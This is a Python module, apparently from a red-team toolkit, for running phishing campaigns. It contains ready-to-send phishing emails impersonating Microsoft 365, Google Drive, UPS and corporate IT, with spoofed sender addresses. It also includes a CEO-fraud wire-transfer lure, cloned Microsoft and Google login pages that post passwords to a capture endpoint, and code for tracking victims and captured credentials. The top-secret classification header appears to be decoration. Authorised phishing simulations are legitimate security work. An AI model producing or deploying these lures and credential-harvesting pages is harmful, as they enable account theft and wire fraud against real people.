"""
ORDL RED TEAM - SOCIAL ENGINEERING MODULE
Classification: TOP SECRET//SCI//NOFORN

Advanced social engineering capabilities:
- Phishing campaign management
- Email template generation
- Credential harvesting
- Pretexting scenarios
- USB drop attacks
- QR code phishing
- Voice phishing (vishing) framework
"""

import json
import logging
import re
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
import uuid
import random

logger = logging.getLogger(__name__)


class CampaignStatus(Enum):
    """Campaign status states"""
    DRAFT = "draft"
    SCHEDULED = "scheduled"
    RUNNING = "running"
    PAUSED = "paused"
    COMPLETED = "completed"
    CANCELLED = "cancelled"


class EmailType(Enum):
    """Types of phishing emails"""
    CREDENTIAL_HARVEST = "credential_harvest"
    MALWARE_DELIVERY = "malware_delivery"
    LINK_CLICK = "link_click"
    ATTACHMENT_OPEN = "attachment_open"
    WIRE_TRANSFER = "wire_transfer"
    BUSINESS_EMAIL_COMPROMISE = "bec"
    SPEAR_PHISHING = "spear_phishing"
    WHALING = "whaling"


class DeliveryMethod(Enum):
    """Payload delivery methods"""
    EMAIL = "email"
    SMS = "sms"
    VOICE = "voice"
    USB = "usb"
    PHYSICAL = "physical"
    QR_CODE = "qr_code"
    SOCIAL_MEDIA = "social_media"


@dataclass
class PhishingTemplate:
    """Phishing email template"""
    template_id: str
    name: str
    description: str
    email_type: EmailType
    subject: str
    body_html: str
    body_text: str
    sender_name: str
    sender_email: str
    attachment_name: str = ""
    attachment_type: str = ""
    landing_page_url: str = ""
    variables: List[str] = field(default_factory=list)
    created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())


@dataclass
class Target:
    """Social engineering target"""
    target_id: str
    first_name: str
    last_name: str
    email: str
    phone: str = ""
    company: str = ""
    position: str = ""
    department: str = ""
    linkedin: str = ""
    osint_data: Dict = field(default_factory=dict)
    tags: List[str] = field(default_factory=list)
    notes: str = ""


@dataclass
class CampaignResult:
    """Result of a phishing campaign"""
    result_id: str
    campaign_id: str
    target_id: str
    email_sent: bool = False
    email_opened: bool = False
    link_clicked: bool = False
    credentials_entered: bool = False
    attachment_opened: bool = False
    replied: bool = False
    reported: bool = False
    ip_address: str = ""
    user_agent: str = ""
    timestamp: str = ""


@dataclass
class PhishingCampaign:
    """Phishing campaign"""
    campaign_id: str
    name: str
    description: str
    status: CampaignStatus
    template_id: str
    targets: List[str] = field(default_factory=list)  # target_ids
    delivery_method: DeliveryMethod = DeliveryMethod.EMAIL
    schedule: Dict = field(default_factory=dict)
    created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    started_at: Optional[str] = None
    completed_at: Optional[str] = None
    results: List[CampaignResult] = field(default_factory=list)
    landing_page_html: str = ""
    redirect_url: str = ""
    tracking_enabled: bool = True
    operation_id: str = ""


class SocialEngineering:
    """
    Social engineering campaign management system.
    Coordinates phishing, vishing, and physical security assessments.
    """
    
    def __init__(self, redteam_manager=None):
        self.rt_manager = redteam_manager
        self.templates: Dict[str, PhishingTemplate] = {}
        self.campaigns: Dict[str, PhishingCampaign] = {}
        self.targets: Dict[str, Target] = {}
        self.results: Dict[str, CampaignResult] = {}
        
        # Initialize default templates
        self._init_default_templates()
        
    def _init_default_templates(self):
        """Initialize default phishing templates"""
        
        # Microsoft 365 Login Template
        self.add_template(
            name="Microsoft 365 Security Alert",
            description="Fake Microsoft security notification",
            email_type=EmailType.CREDENTIAL_HARVEST,
            subject="Action Required: Unusual sign-in activity detected",
            body_html="""
            <html>
            <body style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
                <div style="background: #0078d4; color: white; padding: 20px;">
                    <h2>Microsoft 365 Security Center</h2>
                </div>
                <div style="padding: 20px; border: 1px solid #ddd;">
                    <h3>Unusual Sign-in Activity Detected</h3>
                    <p>Dear {{first_name}},</p>
                    <p>We've detected unusual sign-in activity on your Microsoft 365 account from an unrecognized device.</p>
                    <div style="background: #fff4e5; padding: 15px; border-left: 4px solid #ff9800;">
                        <strong>Sign-in Details:</strong><br>
                        Location: Moscow, Russia<br>
                        IP Address: 185.220.101.x<br>
                        Time: {{timestamp}}<br>
                        Device: Unknown
                    </div>
                    <p>If this wasn't you, please verify your account immediately:</p>
                    <a href="{{phishing_url}}" style="background: #0078d4; color: white; padding: 12px 24px; text-decoration: none; display: inline-block;">Verify Account</a>
                    <p style="color: #666; font-size: 12px; margin-top: 20px;">
                        This email was sent from Microsoft 365 Security Center.<br>
                        Microsoft respects your privacy. Review our privacy policy.
                    </p>
                </div>
            </body>
            </html>
            """,
            body_text="""
Microsoft 365 Security Alert

Dear {{first_name}},

We've detected unusual sign-in activity on your Microsoft 365 account from an unrecognized device.

Sign-in Details:
- Location: Moscow, Russia
- IP Address: 185.220.101.x
- Time: {{timestamp}}
- Device: Unknown

If this wasn't you, please verify your account immediately:
{{phishing_url}}

This email was sent from Microsoft 365 Security Center.
            """,
            sender_name="Microsoft 365 Security",
            sender_email="security@microsoft.com",
            variables=["first_name", "email", "timestamp", "phishing_url"]
        )
        
        # IT Support Template
        self.add_template(
            name="IT Support Password Reset",
            description="Fake IT support password reset request",
            email_type=EmailType.CREDENTIAL_HARVEST,
            subject="URGENT: Password Reset Required - Account Security",
            body_html="""
            <html>
            <body style="font-family: Arial, sans-serif;">
                <h2>IT Support - {{company}}</h2>
                <p>Dear {{first_name}} {{last_name}},</p>
                <p>As part of our quarterly security audit, all employees are required to verify their account credentials.</p>
                <p><strong>Action Required:</strong> Please click the link below to verify your password:</p>
                <p><a href="{{phishing_url}}" style="background: #d9534f; color: white; padding: 10px 20px; text-decoration: none;">Verify Password</a></p>
                <p><strong>Note:</strong> Failure to verify within 24 hours will result in account suspension.</p>
                <hr>
                <p style="font-size: 12px; color: #666;">
                    IT Department<br>
                    {{company}}<br>
                    This is an automated message. Do not reply.
                </p>
            </body>
            </html>
            """,
            body_text="""
IT Support - {{company}}

Dear {{first_name}} {{last_name}},

As part of our quarterly security audit, all employees are required to verify their account credentials.

Action Required: Please verify your password within 24 hours:
{{phishing_url}}

Note: Failure to verify within 24 hours will result in account suspension.

IT Department
{{company}}
            """,
            sender_name="IT Support",
            sender_email="it-support@{{domain}}",
            variables=["first_name", "last_name", "company", "domain", "phishing_url"]
        )
        
        # Document Sharing Template
        self.add_template(
            name="Shared Document Notification",
            description="Fake document sharing notification",
            email_type=EmailType.LINK_CLICK,
            subject="{{sender_name}} has shared a document with you",
            body_html="""
            <html>
            <body style="font-family: Arial, sans-serif;">
                <div style="border: 1px solid #ddd; padding: 20px; max-width: 500px;">
                    <h3>{{sender_name}} shared a document</h3>
                    <p>{{sender_name}} ({{sender_email}}) has invited you to view the following document:</p>
                    <div style="border: 1px solid #ccc; padding: 15px; background: #f9f9f9;">
                        <strong>Q4 Financial Report - Confidential.pdf</strong><br>
                        <span style="color: #666;">PDF Document - 2.4 MB</span>
                    </div>
                    <p style="margin-top: 20px;">
                        <a href="{{phishing_url}}" style="background: #4285f4; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px;">Open in Docs</a>
                    </p>
                    <p style="font-size: 12px; color: #666; margin-top: 20px;">
                        Google Drive logo and Google Drive are trademarks of Google Inc.<br>
                        {{sender_email}} is outside your organization.
                    </p>
                </div>
            </body>
            </html>
            """,
            body_text="""
{{sender_name}} shared a document

{{sender_name}} ({{sender_email}}) has invited you to view the following document:

Q4 Financial Report - Confidential.pdf
PDF Document - 2.4 MB

Open: {{phishing_url}}

Google Drive
            """,
            sender_name="Google Drive",
            sender_email="drive-noreply@google.com",
            variables=["sender_name", "sender_email", "phishing_url"]
        )
        
        # UPS/FedEx Delivery Template
        self.add_template(
            name="Package Delivery Failed",
            description="Fake delivery notification",
            email_type=EmailType.LINK_CLICK,
            subject="Delivery Attempt Failed - Action Required",
            body_html="""
            <html>
            <body style="font-family: Arial, sans-serif;">
                <div style="background: #351c15; color: white; padding: 20px;">
                    <h2>UPS</h2>
                </div>
                <div style="padding: 20px; border: 1px solid #ddd;">
                    <h3>Delivery Attempt Unsuccessful</h3>
                    <p>Dear {{first_name}},</p>
                    <p>We attempted to deliver your package today but no one was available to receive it.</p>
                    <div style="background: #f5f5f5; padding: 15px; border: 1px solid #ddd;">
                        <strong>Tracking Number:</strong> 1Z999AA10123456784<br>
                        <strong>Delivery Address:</strong> {{address}}<br>
                        <strong>Attempt Date:</strong> {{date}}
                    </div>
                    <p>To reschedule delivery, please click below:</p>
                    <a href="{{phishing_url}}" style="background: #ffb500; color: #351c15; padding: 12px 24px; text-decoration: none; font-weight: bold;">Reschedule Delivery</a>
                    <p style="color: #d9534f;"><strong>Important:</strong> Packages not rescheduled within 5 days will be returned to sender.</p>
                </div>
            </body>
            </html>
            """,
            body_text="""
UPS Delivery Attempt Unsuccessful

Dear {{first_name}},

We attempted to deliver your package today but no one was available to receive it.

Tracking Number: 1Z999AA10123456784
Delivery Address: {{address}}
Attempt Date: {{date}}

To reschedule delivery, please visit:
{{phishing_url}}

Important: Packages not rescheduled within 5 days will be returned to sender.
            """,
            sender_name="UPS Notifications",
            sender_email="noreply@ups.com",
            variables=["first_name", "address", "date", "phishing_url"]
        )
        
        # CEO Fraud / BEC Template
        self.add_template(
            name="CEO Fraud - Urgent Wire Transfer",
            description="Business email compromise template",
            email_type=EmailType.WIRE_TRANSFER,
            subject="URGENT: Wire Transfer Request",
            body_html="""
            <html>
            <body style="font-family: Arial, sans-serif;">
                <p>Hi {{first_name}},</p>
                <p>I'm in meetings all day and need your help with an urgent matter.</p>
                <p>I need you to process a wire transfer for an acquisition we're working on. This is time-sensitive and confidential.</p>
                <p><strong>Amount:</strong> $47,500.00<br>
                <strong>Beneficiary:</strong> Global Tech Solutions Ltd<br>
                <strong>Account:</strong> ****4521<br>
                <strong>Reference:</strong> Acquisition-Q4</p>
                <p>Please confirm once processed. I'll send the full details shortly.</p>
                <p>Regards,<br>
                {{ceo_name}}<br>
                CEO | {{company}}</p>
                <p style="font-size: 11px; color: #666;">Sent from my iPhone</p>
            </body>
            </html>
            """,
            body_text="""
Hi {{first_name}},

I'm in meetings all day and need your help with an urgent matter.

I need you to process a wire transfer for an acquisition we're working on. This is time-sensitive and confidential.

Amount: $47,500.00
Beneficiary: Global Tech Solutions Ltd
Account: ****4521
Reference: Acquisition-Q4

Please confirm once processed. I'll send the full details shortly.

Regards,
{{ceo_name}}
CEO | {{company}}

Sent from my iPhone
            """,
            sender_name="{{ceo_name}}",
            sender_email="{{ceo_email}}",
            variables=["first_name", "ceo_name", "ceo_email", "company"]
        )
    
    def add_template(self, name: str, description: str, email_type: EmailType,
                    subject: str, body_html: str, body_text: str,
                    sender_name: str, sender_email: str,
                    attachment_name: str = "", attachment_type: str = "",
                    variables: List[str] = None) -> PhishingTemplate:
        """Add a new phishing template"""
        
        template_id = f"TMPL-{len(self.templates)+1:04d}"
        
        template = PhishingTemplate(
            template_id=template_id,
            name=name,
            description=description,
            email_type=email_type,
            subject=subject,
            body_html=body_html,
            body_text=body_text,
            sender_name=sender_name,
            sender_email=sender_email,
            attachment_name=attachment_name,
            attachment_type=attachment_type,
            variables=variables or []
        )
        
        self.templates[template_id] = template
        logger.info(f"[Social] Template added: {template_id} ({name})")
        return template
    
    def get_template(self, template_id: str) -> Optional[PhishingTemplate]:
        """Get template by ID"""
        return self.templates.get(template_id)
    
    def list_templates(self, email_type: EmailType = None) -> List[PhishingTemplate]:
        """List all templates, optionally filtered by type"""
        templates = list(self.templates.values())
        if email_type:
            templates = [t for t in templates if t.email_type == email_type]
        return templates
    
    def add_target(self, first_name: str, last_name: str, email: str,
                  phone: str = "", company: str = "", position: str = "",
                  department: str = "", linkedin: str = "",
                  tags: List[str] = None, notes: str = "") -> Target:
        """Add a new target"""
        
        target_id = f"TGT-{len(self.targets)+1:05d}"
        
        target = Target(
            target_id=target_id,
            first_name=first_name,
            last_name=last_name,
            email=email,
            phone=phone,
            company=company,
            position=position,
            department=department,
            linkedin=linkedin,
            tags=tags or [],
            notes=notes
        )
        
        self.targets[target_id] = target
        logger.info(f"[Social] Target added: {target_id} ({email})")
        return target
    
    def get_target(self, target_id: str) -> Optional[Target]:
        """Get target by ID"""
        return self.targets.get(target_id)
    
    def list_targets(self, company: str = None, tags: List[str] = None) -> List[Target]:
        """List targets with optional filtering"""
        targets = list(self.targets.values())
        
        if company:
            targets = [t for t in targets if t.company == company]
        
        if tags:
            targets = [t for t in targets if any(tag in t.tags for tag in tags)]
        
        return targets
    
    def create_campaign(self, name: str, description: str,
                       template_id: str,
                       target_ids: List[str],
                       operation_id: str = "",
                       delivery_method: DeliveryMethod = DeliveryMethod.EMAIL,
                       schedule: Dict = None) -> Optional[PhishingCampaign]:
        """Create a new phishing campaign"""
        
        # Validate template
        template = self.templates.get(template_id)
        if not template:
            logger.error(f"[Social] Template not found: {template_id}")
            return None
        
        # Validate targets
        valid_targets = []
        for tid in target_ids:
            if tid in self.targets:
                valid_targets.append(tid)
            else:
                logger.warning(f"[Social] Target not found: {tid}")
        
        if not valid_targets:
            logger.error("[Social] No valid targets for campaign")
            return None
        
        campaign_id = f"CAMP-{len(self.campaigns)+1:05d}"
        
        campaign = PhishingCampaign(
            campaign_id=campaign_id,
            name=name,
            description=description,
            status=CampaignStatus.DRAFT,
            template_id=template_id,
            targets=valid_targets,
            delivery_method=delivery_method,
            schedule=schedule or {},
            operation_id=operation_id
        )
        
        self.campaigns[campaign_id] = campaign
        
        # Audit log
        if self.rt_manager and self.rt_manager.audit_logger:
            self.rt_manager.audit_logger.log(
                event_type="REDTEAM_CAMPAIGN_CREATED",
                user_codename="system",
                resource_id=campaign_id,
                action="CREATE",
                status="SUCCESS",
                details={
                    "name": name,
                    "template": template_id,
                    "targets": len(valid_targets),
                    "classification": "TOP SECRET//SCI//NOFORN"
                }
            )
        
        logger.info(f"[Social] Campaign created: {campaign_id} ({name})")
        return campaign
    
    def get_campaign(self, campaign_id: str) -> Optional[PhishingCampaign]:
        """Get campaign by ID"""
        return self.campaigns.get(campaign_id)
    
    def list_campaigns(self, status: CampaignStatus = None) -> List[PhishingCampaign]:
        """List campaigns with optional status filter"""
        campaigns = list(self.campaigns.values())
        if status:
            campaigns = [c for c in campaigns if c.status == status]
        return campaigns
    
    def start_campaign(self, campaign_id: str) -> bool:
        """Start a phishing campaign"""
        campaign = self.campaigns.get(campaign_id)
        if not campaign:
            return False
        
        campaign.status = CampaignStatus.RUNNING
        campaign.started_at = datetime.utcnow().isoformat()
        
        logger.info(f"[Social] Campaign started: {campaign_id}")
        return True
    
    def pause_campaign(self, campaign_id: str) -> bool:
        """Pause a running campaign"""
        campaign = self.campaigns.get(campaign_id)
        if not campaign:
            return False
        
        campaign.status = CampaignStatus.PAUSED
        logger.info(f"[Social] Campaign paused: {campaign_id}")
        return True
    
    def complete_campaign(self, campaign_id: str) -> bool:
        """Mark campaign as completed"""
        campaign = self.campaigns.get(campaign_id)
        if not campaign:
            return False
        
        campaign.status = CampaignStatus.COMPLETED
        campaign.completed_at = datetime.utcnow().isoformat()
        logger.info(f"[Social] Campaign completed: {campaign_id}")
        return True
    
    def render_template(self, template_id: str, target_id: str,
                       extra_vars: Dict = None) -> Dict[str, str]:
        """
        Render template with target variables.
        
        Returns:
            Dict with 'subject', 'body_html', 'body_text', 'sender'
        """
        template = self.templates.get(template_id)
        target = self.targets.get(target_id)
        
        if not template or not target:
            return {}
        
        # Build variable dictionary
        variables = {
            "first_name": target.first_name,
            "last_name": target.last_name,
            "email": target.email,
            "company": target.company,
            "position": target.position,
            "department": target.department,
            "domain": target.email.split('@')[1] if '@' in target.email else "",
            "timestamp": datetime.utcnow().isoformat(),
            "date": datetime.utcnow().strftime("%Y-%m-%d"),
            "tracking_id": str(uuid.uuid4())[:8]
        }
        
        if extra_vars:
            variables.update(extra_vars)
        
        # Replace variables in template
        def replace_vars(text: str) -> str:
            for key, value in variables.items():
                text = text.replace(f"{{{{{key}}}}}", str(value))
            return text
        
        return {
            "subject": replace_vars(template.subject),
            "body_html": replace_vars(template.body_html),
            "body_text": replace_vars(template.body_text),
            "sender_name": replace_vars(template.sender_name),
            "sender_email": replace_vars(template.sender_email)
        }
    
    def record_interaction(self, campaign_id: str, target_id: str,
                          interaction_type: str, details: Dict = None) -> bool:
        """
        Record target interaction with phishing content.
        
        Args:
            campaign_id: Campaign ID
            target_id: Target ID
            interaction_type: email_opened, link_clicked, credentials_entered, etc.
            details: Additional details (IP, user_agent, etc.)
        """
        campaign = self.campaigns.get(campaign_id)
        if not campaign:
            return False
        
        # Find or create result
        result = None
        for r in campaign.results:
            if r.target_id == target_id:
                result = r
                break
        
        if not result:
            result = CampaignResult(
                result_id=f"RES-{len(campaign.results)+1:05d}",
                campaign_id=campaign_id,
                target_id=target_id,
                email_sent=True
            )
            campaign.results.append(result)
        
        # Update based on interaction type
        if interaction_type == "email_opened":
            result.email_opened = True
        elif interaction_type == "link_clicked":
            result.link_clicked = True
        elif interaction_type == "credentials_entered":
            result.credentials_entered = True
        elif interaction_type == "attachment_opened":
            result.attachment_opened = True
        elif interaction_type == "replied":
            result.replied = True
        elif interaction_type == "reported":
            result.reported = True
        
        if details:
            result.ip_address = details.get("ip", "")
            result.user_agent = details.get("user_agent", "")
        
        result.timestamp = datetime.utcnow().isoformat()
        
        logger.info(f"[Social] Interaction recorded: {interaction_type} for {target_id}")
        return True
    
    def get_campaign_statistics(self, campaign_id: str) -> Dict:
        """Get statistics for a campaign"""
        campaign = self.campaigns.get(campaign_id)
        if not campaign:
            return {}
        
        total = len(campaign.targets)
        results = campaign.results
        
        return {
            "campaign_id": campaign_id,
            "name": campaign.name,
            "status": campaign.status.value,
            "total_targets": total,
            "emails_sent": len(results),
            "emails_opened": sum(1 for r in results if r.email_opened),
            "links_clicked": sum(1 for r in results if r.link_clicked),
            "credentials_captured": sum(1 for r in results if r.credentials_entered),
            "attachments_opened": sum(1 for r in results if r.attachment_opened),
            "replies_received": sum(1 for r in results if r.replied),
            "reported": sum(1 for r in results if r.reported),
            "click_rate": (sum(1 for r in results if r.link_clicked) / total * 100) if total > 0 else 0,
            "credential_rate": (sum(1 for r in results if r.credentials_entered) / total * 100) if total > 0 else 0
        }
    
    def generate_landing_page(self, campaign_id: str, 
                             mimic_url: str = "microsoft.com") -> str:
        """
        Generate a credential harvesting landing page.
        
        Args:
            campaign_id: Campaign ID
            mimic_url: URL to mimic (microsoft.com, google.com, etc.)
        
        Returns:
            HTML for landing page
        """
        # Microsoft 365 login page clone
        if "microsoft" in mimic_url.lower() or "office" in mimic_url.lower():
            return self._generate_microsoft_login_page(campaign_id)
        
        # Google login page clone
        elif "google" in mimic_url.lower():
            return self._generate_google_login_page(campaign_id)
        
        # Generic login page
        else:
            return self._generate_generic_login_page(campaign_id)
    
    def _generate_microsoft_login_page(self, campaign_id: str) -> str:
        """Generate Microsoft 365 login page clone"""
        return """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Sign in to your account</title>
            <style>
                body { font-family: "Segoe UI", Roboto, Arial; background: #f2f2f2; margin: 0; }
                .container { max-width: 440px; margin: 50px auto; background: white; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
                .logo { margin-bottom: 20px; }
                h2 { font-weight: 300; margin: 0 0 20px 0; }
                input[type="email"], input[type="password"] {
                    width: 100%; padding: 6px 10px; border: 1px solid #666;
                    margin: 8px 0; font-size: 15px;
                }
                button {
                    background: #0067b8; color: white; border: none;
                    padding: 8px 32px; font-size: 15px; cursor: pointer;
                }
                .links { font-size: 13px; margin-top: 20px; }
                .links a { color: #0067b8; text-decoration: none; margin-right: 15px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">
                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMSAyMSI+PHBhdGggZD0iTTEgMWg5djlIMUMxeiIgZmlsbD0iI2YyNTAyMiIvPjxwYXRoIGQ9Ik0xMSAxaDl2OWgtOXoiIGZpbGw9IiM3ZmJhMDAiLz48cGF0aCBkPSJNMSAxMWg5djlIMUMxeiIgZmlsbD0iIzAwYTRlZiIvPjxwYXRoIGQ9Ik0xMSAxMWg5djlIMMUnixoiIGZpbGw9IiNmZmJ5MDAiLz48L3N2Zz4=" width="25" height="25" style="vertical-align: middle;">
                    <span style="font-size: 24px; vertical-align: middle; margin-left: 10px;">Microsoft</span>
                </div>
                <h2>Sign in</h2>
                <form id="loginForm" method="POST" action="/api/redteam/capture/{campaign_id}">
                    <input type="email" name="email" placeholder="Email, phone, or Skype" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <p><a href="#" style="color: #0067b8; font-size: 13px;">Forgot password?</a></p>
                    <button type="submit">Sign in</button>
                </form>
                <div class="links">
                    <a href="#">Can't access your account?</a>
                </div>
            </div>
        </body>
        </html>
        """.format(campaign_id=campaign_id)
    
    def _generate_google_login_page(self, campaign_id: str) -> str:
        """Generate Google login page clone"""
        return """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Sign in - Google Accounts</title>
            <style>
                body { font-family: Roboto, Arial; background: #fff; margin: 0; }
                .container { max-width: 450px; margin: 100px auto; border: 1px solid #dadce0; border-radius: 8px; padding: 48px; }
                .logo { text-align: center; margin-bottom: 24px; }
                h1 { text-align: center; font-size: 24px; font-weight: 400; margin: 0 0 24px 0; }
                input[type="email"], input[type="password"] {
                    width: 100%; padding: 13px 15px; border: 1px solid #dadce0;
                    border-radius: 4px; font-size: 16px; margin: 8px 0;
                    box-sizing: border-box;
                }
                button {
                    background: #1a73e8; color: white; border: none;
                    padding: 12px 24px; font-size: 14px; border-radius: 4px;
                    cursor: pointer; float: right;
                }
                .links { margin-top: 40px; font-size: 14px; }
                .links a { color: #1a73e8; text-decoration: none; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">
                    <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M74.6 12.3c0-.8-.1-1.6-.2-2.3H62.2v4.4h7c-.1 1.5-1.1 2.8-2.9 3.6v3h4.7c2.8-2.6 4.6-6.4 4.6-8.7z" fill="#4285F4"/>
                        <path d="M62.2 24c3.9 0 7.2-1.3 9.6-3.5l-4.7-3c-1.3.9-3 1.4-4.9 1.4-3.8 0-7-2.6-8.1-6H49v3.1C51.4 21.4 56.4 24 62.2 24z" fill="#34A853"/>
                        <path d="M54.1 14.9c-.3-.9-.5-1.9-.5-2.9s.2-2 .5-2.9V6H49c-1 2-1.5 4.2-1.5 6.4s.5 4.4 1.5 6.4l5.1-3.9z" fill="#FBBC05"/>
                        <path d="M62.2 4.7c2.1 0 4.1.7 5.6 2.1l4.2-4.2C69.1 1.2 65.9 0 62.2 0 56.4 0 51.4 2.6 49 6.5l5.1 3.9c1.1-3.4 4.3-5.7 8.1-5.7z" fill="#EA4335"/>
                    </svg>
                </div>
                <h1>Sign in</h1>
                <p style="text-align: center; color: #5f6368; margin-bottom: 32px;">to continue to Gmail</p>
                <form id="loginForm" method="POST" action="/api/redteam/capture/{campaign_id}">
                    <input type="email" name="email" placeholder="Email or phone" required>
                    <input type="password" name="password" placeholder="Enter your password" required>
                    <div class="links">
                        <a href="#">Forgot email?</a>
                        <button type="submit">Next</button>
                    </div>
                </form>
            </div>
        </body>
        </html>
        """.format(campaign_id=campaign_id)
    
    def _generate_generic_login_page(self, campaign_id: str) -> str:
        """Generate generic login page"""
        return """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Secure Login</title>
            <style>
                body { font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; }
                .container { max-width: 400px; margin: 100px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                h2 { text-align: center; margin-bottom: 30px; }
                input[type="email"], input[type="password"] {
                    width: 100%; padding: 12px; border: 1px solid #ddd;
                    border-radius: 4px; margin: 8px 0; box-sizing: border-box;
                }
                button {
                    width: 100%; background: #007bff; color: white; border: none;
                    padding: 12px; border-radius: 4px; font-size: 16px; cursor: pointer;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Secure Login</h2>
                <form method="POST" action="/api/redteam/capture/{campaign_id}">
                    <input type="email" name="email" placeholder="Email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Sign In</button>
                </form>
            </div>
        </body>
        </html>
        """.format(campaign_id=campaign_id)
    
    def get_statistics(self) -> Dict:
        """Get social engineering statistics"""
        total_campaigns = len(self.campaigns)
        active_campaigns = sum(1 for c in self.campaigns.values() if c.status == CampaignStatus.RUNNING)
        total_targets = len(self.targets)
        
        # Calculate overall success rates
        total_emails = 0
        total_clicks = 0
        total_creds = 0
        
        for campaign in self.campaigns.values():
            stats = self.get_campaign_statistics(campaign.campaign_id)
            total_emails += stats.get("emails_sent", 0)
            total_clicks += stats.get("links_clicked", 0)
            total_creds += stats.get("credentials_captured", 0)
        
        return {
            "total_campaigns": total_campaigns,
            "active_campaigns": active_campaigns,
            "total_targets": total_targets,
            "total_templates": len(self.templates),
            "emails_sent": total_emails,
            "total_clicks": total_clicks,
            "credentials_captured": total_creds,
            "overall_click_rate": (total_clicks / total_emails * 100) if total_emails > 0 else 0,
            "overall_credential_rate": (total_creds / total_emails * 100) if total_emails > 0 else 0
        }


__all__ = [
    'SocialEngineering',
    'PhishingCampaign',
    'PhishingTemplate',
    'Target',
    'CampaignResult',
    'CampaignStatus',
    'EmailType',
    'DeliveryMethod'
]
